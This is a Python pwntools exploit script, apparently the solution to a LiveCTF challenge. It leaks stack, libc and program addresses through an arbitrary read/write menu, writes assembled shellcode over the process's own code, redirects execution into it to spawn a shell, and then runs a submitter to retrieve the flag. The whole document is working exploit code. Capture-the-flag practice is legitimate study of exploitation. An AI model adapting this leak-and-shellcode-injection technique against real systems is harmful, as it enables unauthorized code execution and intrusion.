import sys
from time import sleep

LOCAL = "LOCAL" in sys.argv
#LOCAL = True

from ptrlib import nasm
from pwn import *

BIN_NAME = '../handout/challenge'
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337
REMOTE_LIBC_PATH = 'libc.so.6'

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def readv(addr):
  stream.sendlineafter(b'Choice:', b'1')
  stream.sendlineafter(b'Address:', hex(addr)[2:])
  stream.recvuntil(b"Value: ")
  return int(stream.recvline(keepends=False), 16)

def writev(addr, val):
  stream.sendlineafter(b'Choice:', b'2')
  stream.sendlineafter(b'Value:', hex(val)[2:])
  stream.sendlineafter(b'Address:', hex(addr)[2:])

addr_stack = readv(0)
print(hex(addr_stack))

addr_libc = readv(addr_stack - 0x88 + 0x18) - 0x29e40
print(hex(addr_libc))

addr_proc = readv(addr_stack - 0x88 + 0x28) - 0x32a8
print(hex(addr_proc))

shellcode = nasm(f"""
  mov eax, 110
  syscall
  mov ebp, eax

  mov rdx, {addr_libc + 0x1d8678} ; /bin/sh
  mov rsi, {addr_stack - 0x110}
  mov edi, ebp
  mov rax, {addr_proc + 0x14fc}
  call rax

  mov rdx, {addr_libc + 0x50d70} ; system
  mov rsi, {addr_stack - 0x110 + 8}
  mov edi, ebp
  mov rax, {addr_proc + 0x14fc}
  call rax

  mov rdx, {addr_libc + 0x001bbea1}
  mov rsi, {addr_proc + 0x3500}
  mov edi, ebp
  mov rax, {addr_proc + 0x14fc}
  call rax  


""", bits=64)
shellcode += b'\x90' * (8 - (len(shellcode) % 8))

shellcode2 = nasm(f"""
  mov rax, {addr_proc + 0x1654}
  jmp rax
""", bits=64)
shellcode2 += b'\x90' * (8 - (len(shellcode2) % 8))

for i in range(0, len(shellcode), 8):
    val = u64(shellcode[i:i+8])
    writev(addr_proc + 0x1654 + i, val)
for i in range(0, len(shellcode2), 8):
    val = u64(shellcode2[i:i+8])
    writev(addr_proc + 0x1488 + i, val)
jmper = asm("jmp $+14") + b"\x90"*6
writev(addr_proc + 0x147a, u64(jmper))

time.sleep(0.5)
stream.sendlineafter(b":", b"3")

if LOCAL:
  stream.interactive()
else:
  sleep(1)
  stream.sendline(b"./submitter")
  while True:
    try:
      flag = stream.recvline()
      print(flag)
      if b'LiveCTF{' not in flag: continue
      print(flag.strip().decode())
      break
    except Exception as e:
      print(e)
